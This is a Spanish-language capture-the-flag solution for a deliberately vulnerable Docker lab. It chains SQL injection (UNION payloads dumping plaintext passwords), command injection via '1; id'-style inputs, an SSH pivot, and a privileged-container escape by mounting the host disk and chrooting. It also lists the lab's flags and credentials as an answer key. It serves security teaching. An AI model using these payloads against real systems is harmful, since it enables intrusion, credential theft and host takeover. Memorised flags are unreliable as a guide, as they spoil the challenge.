# Solución — Jump Force CTF

## Resumen de la cadena de ataque

```
SQL Injection ──▶ Credenciales pablo ──▶ SSH a contenedor dos
     │                                          │
Command Injection ──▶ RCE en contenedor uno     │
                                          Flag 1 (User)
                                                │
                                   privileged: true
                                                │
                              mount /dev/sda1 ──▶ chroot al host
                                                │
                                          Flag 2 (Root)
```

---

## Fase 1 — Reconocimiento externo

### 1.1 Escaneo de puertos

```bash
nmap -sV -sC -p- 172.17.0.X
```

Resultado esperado:
- Puerto **80/tcp** abierto — Apache/2.4.x (Debian)

### 1.2 Enumeración web

```bash
gobuster dir -u http://172.17.0.X -w /usr/share/wordlists/dirb/common.txt -x php,html,bak
```

Páginas descubiertas:
```
/index.php          → pista: hay múltiples vulnerabilidades
/password.php       → formulario de consulta por ID
/backup.php         → formulario de suma de dos números
/index.html.bak     → página por defecto de Apache (distracción)
```

---

## Fase 2 — SQL Injection en `password.php`

### Concepto

`password.php` construye la query así:

```php
$query = mysqli_query($dbconnect, "select id,frase from frases where id = '$id';");
```

El parámetro `id` se inserta directamente en la query **sin sanitizar**. Un atacante puede inyectar SQL adicional para alterar la lógica de la consulta.

### 2.1 Verificar la inyección

Navega a `http://localhost:5000/password.php` e introduce:

```
1'
```

Si devuelve un error SQL, la inyección es posible.

### 2.2 Determinar número de columnas (ORDER BY)

```
1' ORDER BY 1-- -
1' ORDER BY 2-- -
1' ORDER BY 3-- -   ← error → la query devuelve 2 columnas
```

### 2.3 UNION para ver qué columnas se reflejan en pantalla

```
1' UNION SELECT 1,2-- -
```

Ambas columnas se muestran. Usamos la segunda para extraer datos.

### 2.4 Listar tablas de la base de datos

```
1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema='poc'-- -
```

Tablas encontradas: `frases`, `flags`, `users`

### 2.5 Extraer columnas de la tabla `users`

```
1' UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'-- -
```

Columnas: `user`, `pass`

### 2.6 Volcar credenciales

```
1' UNION SELECT user,pass FROM users-- -
```

**Resultado:**

| Usuario | Contraseña |
|---|---|
| pablo | `tefeme!.` |
| mark | `highway` |
| vanessa | `proof` |
| hancook | `rupert` |
| louis | `vAncouver.;` |
| Steve | `f1lem0n:D` |

### 2.7 Extraer flag de la tabla `flags`

```
1' UNION SELECT flag_number,flag_value FROM flags-- -
```

**Flag BD (bonus):** `003d873449f8e8ff13b72f2061bfbaa4e5a84b82`

---

## Fase 3 — Command Injection en `backup.php`

### Concepto

`backup.php` ejecuta un comando de shell con entrada del usuario:

```php
$execution = shell_exec('echo ' . $c1 . ' + ' . $c2 . ' | bc');
```

Si `command1 = 1; id` el servidor ejecuta `echo 1; id + ... | bc`, y `id` se ejecuta como comando real del sistema. Referencia: CWE-78.

### 3.1 Verificar RCE

Navega a `http://localhost:5000/backup.php`, responde `Y` e introduce:

- **Numero 1:** `1; id`
- **Numero 2:** `1`

Si devuelve `uid=33(www-data)` confirmamos ejecución remota de comandos.

### 3.2 Descubrir la IP del contenedor `dos` en la red interna

- **Numero 1:** `1; ip route`
- **Numero 2:** `1`

O directamente intentar resolver el hostname por nombre de servicio Docker:

- **Numero 1:** `1; ping -c 1 dos`
- **Numero 2:** `1`

Docker Compose asigna nombres de host por nombre de servicio. El contenedor `dos` es accesible como hostname `dos` desde `uno`.

### 3.3 Verificar puerto SSH en contenedor `dos`

- **Numero 1:** `1; nc -zv dos 2222`
- **Numero 2:** `1`

Puerto 2222 abierto confirmado.

---

## Fase 4 — Pivoting: SSH al contenedor `dos` (Flag 1)

### Concepto

El contenedor `dos` no expone ningún puerto al host (sin `ports:` en docker-compose). Solo es accesible **desde la red interna de Docker**. Se usa el RCE del contenedor `uno` como puente.

### 4.1 Conexión SSH desde el contenedor `uno`

Desde la Command Injection de `backup.php`:

- **Numero 1:** `1; ssh -o StrictHostKeyChecking=no pablo@dos -p 2222`
- **Numero 2:** `1`

O bien, obtenida una reverse shell en `uno`, ejecutar directamente:

```bash
ssh -o StrictHostKeyChecking=no pablo@dos -p 2222
# Password: tefeme!.
```

### 4.2 Obtener Flag 1

```bash
pablo@dos:~$ cat .flag.txt
```

**Flag 1 (User):** `4d8c72671245d9d1b8e03a826db9d5ecead28c8c`

---

## Fase 5 — Escape de contenedor privilegiado (Flag 2)

### Concepto

El `docker-compose.yml` arranca el contenedor `dos` con:

```yaml
privileged: true
```

Esto concede al contenedor acceso a **todos los dispositivos del host**, incluyendo los discos físicos. El proceso equivale a darle las llaves del kernel al contenedor — puede montar el sistema de ficheros del host y acceder a él como si fuera root en la máquina física.

Referencia: **CWE-250** — Execution with Unnecessary Privileges.

### 5.1 Listar dispositivos de bloque del host

Dentro del contenedor `dos` (como `pablo` o tras escalar a root):

```bash
fdisk -l
# o
lsblk
```

Disco del host visible: `/dev/sda`, partición principal `/dev/sda1`

### 5.2 Montar el sistema de ficheros del host

```bash
mkdir /mnt/host
mount /dev/sda1 /mnt/host
```

### 5.3 Acceder al sistema del host via chroot

```bash
chroot /mnt/host
```

Ahora el prompt es el del host real, no del contenedor. Se tiene acceso completo como root.

### 5.4 Obtener Flag 2

```bash
cat /root/flag.txt
```

**Flag 2 (Root / Container Escape):** `648d390c021ce7cfde2f95ea3fcd71ec`

---

## Resumen de credenciales y flags

| Elemento | Valor |
|---|---|
| Usuario SSH contenedor `dos` | `pablo` |
| Contraseña SSH | `tefeme!.` |
| Puerto SSH | `2222` |
| Flag 1 (User) | `4d8c72671245d9d1b8e03a826db9d5ecead28c8c` |
| Flag 2 (Root) | `648d390c021ce7cfde2f95ea3fcd71ec` |
| Flag BD Bonus | `003d873449f8e8ff13b72f2061bfbaa4e5a84b82` |
